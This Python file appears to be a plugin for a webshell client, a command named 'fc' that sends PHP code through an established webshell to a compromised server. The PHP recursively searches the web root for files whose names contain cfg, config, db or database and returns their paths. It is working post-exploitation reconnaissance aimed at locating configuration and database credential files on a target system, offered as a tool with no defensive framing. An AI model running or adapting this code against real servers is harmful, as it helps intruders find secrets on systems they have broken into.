from libs.config import alias, gget
from libs.myapp import send, color, print_tree
from json import JSONDecodeError


def get_php(file_path: str):
    return """$cfgs=array("cfg","config","db","database");
function is_cfg($v,$vv){
    return strstr($v, $vv);
}
function listAllFiles($dir){
    global $cfgs;
    if(is_dir($dir)){
        if($handle=opendir($dir)){
            while(false!==($file=readdir($handle))){
                if($file!="."&&$file!=".."){
                    if(is_dir($dir."/".$file)){
                        $files[$file]=listAllFiles($dir."/".$file);
                    }else if(count(array_filter(array_map("is_cfg", array_fill(0, count($cfgs), $file), $cfgs)))){
                        $files[]=$dir."/".$file;
                    }
                }
            }
            closedir($handle);
        }
    }
    return $files;
}
print(json_encode(listAllFiles("%s")));""" % file_path


@alias(True, fp="file_path")
def run(web_file_path: str = ""):
    """
    fc

    Find config file from target system.

    eg: fc {web_file_path=webroot}
    """
    web_file_path = web_file_path if (len(web_file_path)) else gget("webshell.root", "webshell")
    php = get_php(web_file_path)
    try:
        file_tree = send(f'{php}').r_json
    except JSONDecodeError:
        print(color.red("Null Error"))
        return
    print_tree(web_file_path, file_tree)
